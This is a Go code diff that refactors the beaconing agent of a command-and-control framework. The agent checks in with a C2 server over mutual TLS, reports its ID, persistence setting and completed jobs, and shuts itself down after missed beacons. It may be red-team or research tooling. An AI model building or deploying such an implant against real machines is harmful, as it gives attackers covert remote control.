@@ -24,18 +24,37 @@ type AgentState struct {
 
 	// C2 server address to connect to.
 	serverAddr string
+
 	// Unique identifier for this agent.
-	id string
+	agentID string
 
 	// Persistence flag.
 	isPersistent bool
 
 	// Maximum number of consecutive communication failures allowed.
-	maxMisses int
+	missesBeforeDeath int
 
 	// Time intervals for beaconing and keepalive communication with the server (in seconds).
 	beaconInterval int
-	wakeUpSeconds  int
+
+	// Completed jobs.
+	completedJobs []messages.JobRsp
+}
+
+// newAgentState initializes and returns a new instance of AgentState.
+func newAgentState(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte, serverAddr string) *AgentState {
+	return &AgentState{
+		caCertPEM:         caCertPEM,
+		agentCertPEM:      agentCertPEM,
+		agentKeyPEM:       agentKeyPEM,
+		tlsConfig:         initTLSConfig(caCertPEM, agentCertPEM, agentKeyPEM),
+		serverAddr:        serverAddr,
+		agentID:           "none",
+		isPersistent:      false,
+		missesBeforeDeath: 3,
+		beaconInterval:    10,
+		completedJobs:     []messages.JobRsp{},
+	}
 }
 
 // initTLSConfig creates a new TLS configuration using the provided certificates.
@@ -62,112 +81,70 @@ func initTLSConfig(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) *t
 	return tlsConfig
 }
 
-// newAgentState initializes and returns a new instance of AgentState.
-func newAgentState(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte, serverAddr string) *AgentState {
-	return &AgentState{
-		caCertPEM:      caCertPEM,
-		agentCertPEM:   agentCertPEM,
-		agentKeyPEM:    agentKeyPEM,
-		tlsConfig:      initTLSConfig(caCertPEM, agentCertPEM, agentKeyPEM),
-		serverAddr:     serverAddr,
-		id:             "none",
-		isPersistent:   false,
-		maxMisses:      3,
-		beaconInterval: 10,
-		wakeUpSeconds:  10,
-	}
-}
-
 // connectToC2 opens a TLS connection to the given C2 server.
 func connectToC2(agentState *AgentState) (*tls.Conn, error) {
+
+	// connect to server and get socket
 	conn, err := tls.Dial("tcp", agentState.serverAddr, agentState.tlsConfig)
 	if err != nil {
 		return nil, fmt.Errorf("agent: error dialing server: %w", err)
 	}
+
+	// set a deadline for the connection
+	conn.SetDeadline(time.Now().Add(time.Second * 20))
 	return conn, nil
 }
 
-// communicateWithServer connects to the server, sends a hello message,
-// processes incoming messages in a keepalive loop, and finally sends a goodbye message.
-func communicateWithServer(agentState *AgentState) error {
-	// Connect to the C2 server.
+// build a beacon request for the server
+func buildBeaconReq(agentState *AgentState) (messages.BeaconReq, error) {
+
+	// Build and send a BeaconReq message using the new beacon structure.
+	beaconReq := messages.BeaconReq{
+		AgentInfo: messages.AgentInfo{
+			AgentID:           agentState.agentID,
+			BeaconInterval:    agentState.beaconInterval,
+			MissesBeforeDeath: agentState.missesBeforeDeath,
+			NextBeacon:        int(time.Now().Unix() + int64(agentState.beaconInterval)),
+			Persist:           agentState.isPersistent,
+		},
+		Errors: 0,                        // initial error count
+		JobRsp: agentState.completedJobs, // no job responses initially
+	}
+
+	return beaconReq, nil
+}
+
+// sends a beacon to the server
+func sendAndReceiveBeacon(agentState *AgentState) (messages.BeaconRsp, error) {
+
 	conn, err := connectToC2(agentState)
 	if err != nil {
-		return err
+		return messages.BeaconRsp{}, fmt.Errorf("agent: error connecting to server: %w", err)
 	}
-	defer conn.Close()
 
-	log.Println("agent: connected to server")
+	defer conn.Close()
 
 	encoder := json.NewEncoder(conn)
 	decoder := json.NewDecoder(conn)
 
-	// Send hello message to initiate communication.
-	helloMsg := messages.BuildHelloMessage(
-		agentState.id,
-		agentState.isPersistent,
-		agentState.beaconInterval,
-		agentState.maxMisses,
-		int(time.Now().Unix()+int64(agentState.wakeUpSeconds+(agentState.maxMisses*agentState.beaconInterval))),
-		agentState.wakeUpSeconds,
-		int(time.Now().Unix()+int64(agentState.beaconInterval+agentState.wakeUpSeconds)),
-	)
-	if err := encoder.Encode(helloMsg); err != nil {
-		return fmt.Errorf("agent: error sending hello message: %w", err)
+	// build the beacon request
+	beaconReq, err := buildBeaconReq(agentState)
+	if err != nil {
+		return messages.BeaconRsp{}, fmt.Errorf("agent: error building beacon request: %w", err)
 	}
 
-	log.Println("agent: hello message sent")
-
-	// Maintain a keepalive loop for the specified period.
-	keepAliveDeadline := time.Now().Add(time.Duration(agentState.wakeUpSeconds) * time.Second)
-	for time.Now().Before(keepAliveDeadline) {
-
-		// Set a read timeout (e.g., 5 seconds)
-		readTimeout := 1 * time.Second
-		conn.SetReadDeadline(time.Now().Add(readTimeout))
-
-		// Receive a response from the server.
-		var response messages.C2MessageBase
-		if err := decoder.Decode(&response); err != nil {
-			continue
-		}
-
-		// Optional: Clear the deadline after a successful read.
-		conn.SetReadDeadline(time.Time{})
-
-		log.Println("agent: received server message")
-
-		// Process the received C2 message.
-		processedResponse, err := processC2Messages(agentState, response)
-		if err != nil {
-			return fmt.Errorf("agent: error processing C2 message: %w", err)
-		}
-
-		log.Println("agent: processed server message")
-
-		// Send the processed response back to the server.
-		if err := encoder.Encode(processedResponse); err != nil {
-			return fmt.Errorf("agent: error sending processed message: %w", err)
-		}
-
-		log.Println("agent: processed message sent")
+	// send the beacon request
+	if err := encoder.Encode(beaconReq); err != nil {
+		return messages.BeaconRsp{}, fmt.Errorf("agent: error sending beacon request: %w", err)
 	}
 
-	// Send goodbye message before closing the connection.
-	currentTime := int(time.Now().Unix())
-	goodbyeMsg := messages.BuildGoodbyeMessage(
-		agentState.id,
-		agentState.beaconInterval,
-		currentTime,
-		currentTime+agentState.beaconInterval,
-	)
-	if err := encoder.Encode(goodbyeMsg); err != nil {
-		return fmt.Errorf("agent: error sending goodbye message: %w", err)
+	// Receive a response from the server and decode it as BeaconRsp.
+	var beaconRsp messages.BeaconRsp
+	if err := decoder.Decode(&beaconRsp); err != nil {
+		return messages.BeaconRsp{}, fmt.Errorf("agent: error decoding beacon response: %w", err)
 	}
 
-	log.Println("agent: goodbye message sent")
-
-	return nil
+	return beaconRsp, nil
 }
 
 // routine that runs when the agent dies
@@ -186,19 +163,24 @@ func Start(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) {
 	missedBeacons := 0
 
 	// beacon every beaconInterval seconds until maxMisses is reached
-	for missedBeacons < agentState.maxMisses {
+	for missedBeacons < agentState.missesBeforeDeath {
+
 		log.Println("agent: beaconing to server")
-		if err := communicateWithServer(agentState); err != nil {
-			log.Println("agent: error communicating with server: ", err)
+		beaconRsp, err := sendAndReceiveBeacon(agentState)
+		if err != nil {
+			log.Println("agent: error sending beacon request: ", err)
 			missedBeacons++
 		} else {
 			missedBeacons = 0
+			// process the beacon response
+			processBeaconRsp(beaconRsp)
 		}
+
 		log.Println("agent: sleeping for ", agentState.beaconInterval, " seconds")
 		time.Sleep(time.Duration(agentState.beaconInterval) * time.Second)
 	}
 
-	if missedBeacons >= agentState.maxMisses {
+	if missedBeacons >= agentState.missesBeforeDeath {
 		die()
 	}
 }
